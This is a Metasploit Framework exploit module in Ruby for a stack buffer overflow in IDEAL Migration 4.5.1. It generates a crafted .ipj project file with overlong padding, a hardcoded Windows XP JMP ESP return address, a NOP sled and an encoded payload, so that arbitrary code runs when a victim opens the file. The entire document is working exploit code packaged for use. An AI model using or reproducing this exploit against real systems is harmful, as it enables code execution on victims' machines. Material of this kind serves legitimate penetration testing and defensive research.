###
## This file is part of the Metasploit Framework and may be subject to
## redistribution and commercial restrictions. Please see the Metasploit
## Framework web site for more information on licensing and terms of use.
## http://metasploit.com/framework/
###
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'IDEAL Migration Version 4.5.1 Buffer
Overflow',
            'Description'    => %q{
                    This module exploits a stack overflow in IDEAL Migration
version 4.5.1.
                    By creating a specially crafted ipj file, an an attacker
may be able
                    to execute arbitrary code.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [ 'blake' ],
            'Version'        => 'Version 1',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/12404' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload'        =>
                {
                    'Space'    => 986,
                    'BadChars' => "\x00\x1a\x0a\x0d",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP Universal', { 'Ret' => 0x7c96bf33 } ], #
JMP ESP in ULMigration_us.dll
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'April 26, 2010',
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new('FILENAME',   [ false, 'The file name.',
'msf.ipj']),
                ], self.class)
 
    end
 
    def exploit
 
        sploit =  "\x0D\x0A\x5B\x47\x72\x6F\x75\x70\x2C\x45\x78\x70\x6F"
        sploit << "\x72\x74\x2C\x59\x65\x73\x5D\x0D\x0A"
        sploit << "\x43\x6f\x6d\x70\x75\x74\x65\x72\x3D"
        sploit << rand_text_alpha_upper(2420)
        sploit << [target.ret].pack('V')
        sploit << make_nops(10)
        sploit << payload.encoded
        sploit << "\x0D\x0A\x5B\x45\x6E\x64\x5D\x0D\x0A"
 
        ipj = sploit
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(ipj)
 
    end
 
end
